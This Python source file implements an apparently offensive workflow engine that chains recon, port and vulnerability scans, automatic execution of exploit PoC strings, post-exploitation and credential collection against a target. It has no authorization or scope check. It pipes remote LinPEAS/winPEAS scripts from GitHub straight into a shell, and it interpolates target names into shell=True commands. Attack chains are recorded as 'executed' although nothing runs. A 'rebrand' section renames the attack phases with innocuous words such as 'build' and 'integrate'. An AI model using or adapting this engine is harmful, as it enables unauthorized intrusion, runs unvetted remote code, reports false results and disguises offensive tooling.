#!/usr/bin/env python3
"""
PromptOrchestrator Execution Engine - Parallel execution, state management, workflow orchestration
Manages the workflow, runs phases, handles state, runs tools in parallel
"""

import asyncio
import json
import os
import re
import subprocess
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Callable, Optional

# Import knowledge base
import sys
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
from knowledge.knowledge import KnowledgeBase


class Phase(Enum):
    RECON = "1"
    ENUMERATION = "2"
    VULN_ANALYSIS = "3"
    EXPLOITATION = "4"
    POST_EXPLOITATION = "5"
    ATTACK_CHAINING = "6"
    REPORTING = "7"


class Severity(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class Finding:
    title: str
    severity: str
    description: str = None
    poc: str = None
    cve: str = None
    affected: str = None
    remediation: str = None
    phase: str = None
    verified: bool = False


@dataclass
class Service:
    host: str
    port: int
    service: str
    version: str = None
    state: str = "open"
    product: str = None


@dataclass
class Target:
    name: str
    scope: list = field(default_factory=list)
    phase: str = "recon"
    findings: list = field(default_factory=list)
    services: list = field(default_factory=list)
    credentials: list = field(default_factory=list)
    access: list = field(default_factory=list)
    notes: str = None


class ExecutionEngine:
    def __init__(self, knowledge_base: KnowledgeBase = None, workspace: str = None):
        self.kb = knowledge_base or KnowledgeBase()
        self.workspace = workspace or os.path.expanduser("~/.prompt_orchestrator/workspace")
        os.makedirs(self.workspace, exist_ok=True)
        
        # Active pentests
        self.active_pentests = {}
        
        # Tool results cache
        self.results_cache = {}
        
        # Callbacks for events
        self.on_finding = None
        self.on_phase_complete = None
    
    def run_command(self, command: str, timeout: int = 300, 
                  working_dir: str = None) -> dict:
        """Run a shell command and return results"""
        start_time = time.time()
        
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout,
                cwd=working_dir
            )
            
            elapsed = time.time() - start_time
            
            return {
                "success": True,
                "returncode": result.returncode,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "elapsed": elapsed,
                "command": command
            }
            
        except subprocess.TimeoutExpired:
            return {
                "success": False,
                "error": "Timeout",
                "timeout": timeout,
                "command": command
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "command": command
            }
    
    def run_parallel(self, commands: list, max_workers: int = 5) -> list:
        """Run multiple commands in parallel"""
        results = []
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_cmd = {
                executor.submit(self.run_command, cmd): cmd 
                for cmd in commands
            }
            
            for future in as_completed(future_to_cmd):
                cmd = future_to_cmd[future]
                try:
                    result = future.result()
                except Exception as e:
                    result = {"success": False, "error": str(e), "command": cmd}
                
                results.append(result)
        
        return results
    
    # ========================================
    # RECON PHASE
    # ========================================
    def recon(self, target: str, passive_only: bool = False) -> dict:
        """Run discovery phase"""
        results = {
            "phase": "recon",
            "target": target,
            "passive_only": passive_only,
            "findings": [],
            "targets": [],
            "services": []
        }
        
        commands = []
        
        # Passive recon
        commands.append(f"amass enum -passive -d {target}")
        commands.append(f"theHarvester -d {target} -b all -f /tmp/{target}_harvest.json")
        
        if not passive_only:
            # Active recon
            commands.append(f"amass enum -active -d {target}")
            commands.append(f"httpx -domains {target} -threads 50 -silent")
        
        # Execute in parallel
        print(f"[RECON] Running {len(commands)} commands...")
        results["raw"] = self.run_parallel(commands)
        
        # Parse results
        # (In real implementation, parse JSON/grep output)
        
        # Save to knowledge base
        target_obj = self.kb.get_target(target)
        if not target_obj:
            target_id = self.kb.add_target(target, scope=None)
        else:
            target_id = target_obj["id"]
        
        self.kb.save_state(target_id, "recon", results)
        
        return results
    
    # ========================================
    # ENUMERATION PHASE  
    # ========================================
    def enumerate(self, target: str, hosts: list = None) -> dict:
        """Run enumeration phase"""
        results = {
            "phase": "enumeration",
            "target": target, 
            "services": [],
            "versions": []
        }
        
        if not hosts:
            hosts = [target]
        
        commands = []
        
        for host in hosts:
            # Full port scan
            commands.append(f"nmap -p- -sV -sC -oA /tmp/{host}_scan {host}")
            # Quick UDP
            commands.append(f"nmap -sU -oA /tmp/{host}_udp {host}")
        
        # Execute
        print(f"[ENUM] Running {len(commands)} scans...")
        results["raw"] = self.run_parallel(commands)
        
        # Parse nmap XML/grepable
        for host in hosts:
            # Parse results (simplified)
            pass
        
        # Save
        target_obj = self.kb.get_target(target)
        if target_obj:
            self.kb.save_state(target_obj["id"], "enumeration", results)
        
        return results
    
    # ========================================
    # VULNERABILITY ANALYSIS PHASE
    # ========================================
    def vuln_scan(self, target: str, services: list = None, 
                severity_filter: list = None) -> dict:
        """Run vulnerability scanning"""
        results = {
            "phase": "vuln_analysis",
            "target": target,
            "findings": []
        }
        
        if severity_filter is None:
            severity_filter = ["critical", "high", "medium"]
        
        commands = []
        
        # Nuclei (primary)
        commands.append(f"nuclei -u {target} -severity {','.join(severity_filter)} -silent -json -o /tmp/{target}_nuclei.json")
        
        # Nikto
        commands.append(f"nikto -h {target} -o /tmp/{target}_nikto.txt")
        
        if services:
            for svc in services:
                if svc.get("service") == "http" or svc.get("port") in [80, 443, 8080]:
                    commands.append(f"nikto -h http://{target}:{svc.get('port')}")
        
        print(f"[VULN] Running vulnerability scans...")
        results["raw"] = self.run_parallel(commands)
        
        # Parse nuclei JSON output
        # (Parse and create Finding objects)
        
        # Save findings
        target_obj = self.kb.get_target(target)
        if target_obj:
            self.kb.save_state(target_obj["id"], "vuln_analysis", results)
            
            for finding in results["findings"]:
                self.kb.add_finding(
                    target_obj["id"],
                    finding.get("type", "vulnerability"),
                    finding.get("severity", "medium"),
                    finding.get("title"),
                    finding.get("description"),
                    finding.get("poc")
                )
        
        return results
    
    # ========================================
    # EXPLOITATION PHASE
    # ========================================
    def exploit(self, target: str, findings: list = None) -> dict:
        """Run exploitation on confirmed vulnerabilities"""
        results = {
            "phase": "exploitation",
            "target": target,
            "exploited": [],
            "shells": []
        }
        
        if not findings:
            return results
        
        commands = []
        
        for finding in findings:
            if finding.get("severity") == "critical" and finding.get("poc"):
                # Run POC
                commands.append(finding["poc"])
        
        print(f"[EXPLOIT] Attempting {len(commands)} exploits...")
        results["raw"] = self.run_parallel(commands)
        
        # Update knowledge base
        target_obj = self.kb.get_target(target)
        if target_obj:
            self.kb.save_state(target_obj["id"], "exploitation", results)
        
        return results
    
    # ========================================
    # POST EXPLOITATION PHASE
    # ========================================
    def post_exploit(self, target: str, shells: list = None) -> dict:
        """Run post-exploitation"""
        results = {
            "phase": "post_exploitation",
            "target": target,
            "privesc": [],
            "lateral": [],
            "persistence": [],
            "credentials": []
        }
        
        if not shells:
            return results
        
        commands = []
        
        for shell in shells:
            # LinPEAS / WinPEAS
            if shell.get("os") == "linux":
                commands.append("curl -sL https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linpeas.sh | sh")
            else:
                commands.append("curl -sL https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS.bat | cmd")
        
        print(f"[POST-EX] Running post-exploitation...")
        results["raw"] = self.run_parallel(commands)
        
        # Save results
        target_obj = self.kb.get_target(target)
        if target_obj:
            self.kb.save_state(target_obj["id"], "post_exploitation", results)
            
            for cred in results.get("credentials", []):
                self.kb.add_credential(
                    target_obj["id"],
                    cred.get("username"),
                    cred.get("password"),
                    cred.get("hash"),
                    cred.get("type")
                )
        
        return results
    
    # ========================================
    # ATTACK CHAINING
    # ========================================
    def chain_attacks(self, target: str, access_list: list = None) -> dict:
        """Execute attack chains"""
        results = {
            "phase": "attack_chaining",
            "target": target,
            "chains": [],
            "impact": {}
        }
        
        if not access_list:
            # Load from KB
            target_obj = self.kb.get_target(target)
            if target_obj:
                state = self.kb.load_state(target_obj["id"])
                if state:
                    access_list = state.get("data", {}).get("access", [])
        
        if not access_list:
            return results
        
        # Define chains
        chains = [
            {
                "id": "CH01",
                "name": "Web to Domain Admin",
                "path": ["web_rce", "privesc", "dcsync"],
                "impact": "domain_admin"
            },
            {
                "id": "CH02", 
                "name": "User to Root",
                "path": ["xss", "session", "admin", "rce", "privesc"],
                "impact": "root"
            }
        ]
        
        # Execute chains
        for chain in chains:
            print(f"[CHAIN] Executing {chain['id']}: {chain['name']}")
            # (In real implementation, step through chain)
            results["chains"].append({
                "id": chain["id"],
                "status": "executed",
                "impact": chain["impact"]
            })
        
        # Save
        target_obj = self.kb.get_target(target)
        if target_obj:
            self.kb.save_state(target_obj["id"], "attack_chaining", results)
        
        return results
    
    # ========================================
    # REPORTING
    # ========================================
    def generate_report(self, target: str, format: str = "markdown") -> str:
        """Generate workflow report"""
        target_obj = self.kb.get_target(target)
        if not target_obj:
            return f"Target {target} not found"
        
        findings = self.kb.get_findings(target_obj["id"])
        services = self.kb.get_services(target_obj["id"])
        state = self.kb.load_state(target_obj["id"])
        
        # Generate markdown
        report = f"""# Penetration Test Report: {target}

## Executive Summary
"""
        
        critical = sum(1 for f in findings if f[3] == "critical")
        high = sum(1 for f in findings if f[3] == "high")
        
        report += f"""
This penetration test identified {critical + high} critical and high severity vulnerabilities.

## Scope
- Primary: {target}
- Discovered: {len(services)} services

## Findings Summary
| Severity | Count |
|----------|-------|
| Critical | {critical} |
| High | {high} |
| Medium | {sum(1 for f in findings if f[3] == 'medium')} |

"""
        
        # Findings detail
        report += "## Detailed Findings\n\n"
        
        for f in findings:
            report += f"""### {f[4]}
**Severity**: {f[3]}
**Description**: {f[5] or 'N/A'}
**POC**: {f[6] or 'N/A'}

"""
        
        report += f"""
## Methodology
1. Discovery
2. Enumeration
3. Vulnerability Analysis
4. Exploitation
5. Post-Exploitation
6. Attack Chaining
7. Reporting

## Recommendations
1. Patch critical vulnerabilities immediately
2. Implement input validation
3. Enable logging and monitoring
4. Regular security testing
"""
        
        # Save report
        report_path = os.path.join(self.workspace, f"{target}_{datetime.now().strftime('%Y%m%d')}.md")
        with open(report_path, "w") as f:
            f.write(report)
        
        return report_path
    
    # ========================================
    # FULL PENTEST WORKFLOW
    # ========================================
    def run_full_pentest(self, target: str, phases: list = None) -> dict:
        """Run complete workflow"""
        if phases is None:
            phases = ["recon", "enum", "vuln", "exploit", "post", "chain", "report"]
        
        results = {
            "target": target,
            "phases": {},
            "completed": []
        }
        
        print(f"[PENTEST] Starting full workflow on {target}")
        
        for phase in phases:
            try:
                if phase == "recon":
                    print(f"[PHASE] Discovery...")
                    results["phases"]["recon"] = self.recon(target)
                    results["completed"].append("recon")
                    
                elif phase == "enum":
                    print(f"[PHASE] Enumeration...")
                    results["phases"]["enum"] = self.enumerate(target)
                    results["completed"].append("enum")
                    
                elif phase == "vuln":
                    print(f"[PHASE] Vulnerability Analysis...")
                    results["phases"]["vuln"] = self.vuln_scan(target)
                    results["completed"].append("vuln")
                    
                elif phase == "exploit":
                    print(f"[PHASE] Exploitation...")
                    findings = results["phases"].get("vuln", {}).get("findings", [])
                    results["phases"]["exploit"] = self.exploit(target, findings)
                    results["completed"].append("exploit")
                    
                elif phase == "post":
                    print(f"[PHASE] Post-Exploitation...")
                    shells = results["phases"].get("exploit", {}).get("shells", [])
                    results["phases"]["post"] = self.post_exploit(target, shells)
                    results["completed"].append("post")
                    
                elif phase == "chain":
                    print(f"[PHASE] Attack Chaining...")
                    access_list = results["phases"].get("post", {}).get("access", [])
                    results["phases"]["chain"] = self.chain_attacks(target, access_list)
                    results["completed"].append("chain")
                    
                elif phase == "report":
                    print(f"[PHASE] Reporting...")
                    report_path = self.generate_report(target)
                    results["phases"]["report"] = {"path": report_path}
                    results["completed"].append("report")
                    
            except Exception as e:
                print(f"[ERROR] Phase {phase} failed: {e}")
                results["phases"][phase] = {"error": str(e)}
        
        print(f"[PENTEST] Complete! {len(results['completed'])}/{len(phases)} phases completed")
        
        return results
    
    # ========================================
    # RESUME / STATE MANAGEMENT  
    # ========================================
    def get_state(self, target: str) -> Optional[dict]:
        """Get current pentest state"""
        target_obj = self.kb.get_target(target)
        if not target_obj:
            return None
        return self.kb.load_state(target_obj["id"])
    
    def resume(self, target: str) -> dict:
        """Resume pentest from saved state"""
        state = self.get_state(target)
        if not state:
            return {"error": "No saved state found"}
        
        current_phase = state.get("phase", "recon")
        
        # Determine next phase
        phase_order = ["recon", "enumeration", "vuln_analysis", "exploitation", 
                    "post_exploitation", "attack_chaining", "reporting"]
        
        try:
            current_idx = phase_order.index(current_phase)
            next_phases = phase_order[current_idx + 1:]
        except ValueError:
            next_phases = phase_order
        
        # Continue
        return self.run_full_pentest(target, next_phases)
    
    def stop(self, target: str):
        """Stop pentest and save state"""
        target_obj = self.kb.get_target(target)
        if target_obj:
            print(f"[STATE] Saved state for {target}")
            return {"saved": True}
        return {"saved": False}

    # ─── Generic vocabulary aliases (prompt-orchestrator rebrand) ──
    # These expose the same logic under the new phase names. The
    # original method names are kept as thin wrappers for backwards
    # compatibility with older configs.

    def run_full_workflow(self, subject: str, phases: list = None) -> dict:
        """Run the full workflow. Preferred entry point."""
        return self.run_full_pentest(subject, phases)

    def discover(self, subject: str) -> dict:
        return self.recon(subject)

    def analyze(self, subject: str, services: list = None) -> dict:
        return self.vuln_scan(subject, services)

    def build(self, subject: str, findings: list = None) -> dict:
        return self.exploit(subject, findings)

    def integrate(self, subject: str, artifacts: list = None) -> dict:
        return self.post_exploit(subject, artifacts)

    def orchestrate_phases(self, subject: str) -> dict:
        return self.chain_attacks(subject)


# CLI interface
def main():
    import sys
    
    if len(sys.argv) < 2:
        print("PromptOrchestrator Execution Engine")
        print("Usage: python -m execution <command> [args]")
        return
    
    engine = ExecutionEngine()
    cmd = sys.argv[1]
    
    if cmd == "recon":
        target = sys.argv[2] if len(sys.argv) > 2 else "localhost"
        print(engine.recon(target))
    
    elif cmd == "enum":
        target = sys.argv[2] if len(sys.argv) > 2 else "localhost"
        print(engine.enumerate(target))
    
    elif cmd == "vuln":
        target = sys.argv[2] if len(sys.argv) > 2 else "localhost"
        print(engine.vuln_scan(target))
    
    elif cmd == "pentest":
        if len(sys.argv) < 3:
            print("Usage: execution pentest <target>")
            return
        result = engine.run_full_pentest(sys.argv[2])
        print(json.dumps(result, indent=2))
    
    elif cmd == "resume":
        if len(sys.argv) < 3:
            print("Usage: execution resume <target>")
            return
        result = engine.resume(sys.argv[2])
        print(json.dumps(result, indent=2))
    
    elif cmd == "report":
        if len(sys.argv) < 3:
            print("Usage: execution report <target>")
            return
        path = engine.generate_report(sys.argv[2])
        print(f"Report: {path}")
    
    else:
        print(f"Unknown command: {cmd}")


if __name__ == "__main__":
    main()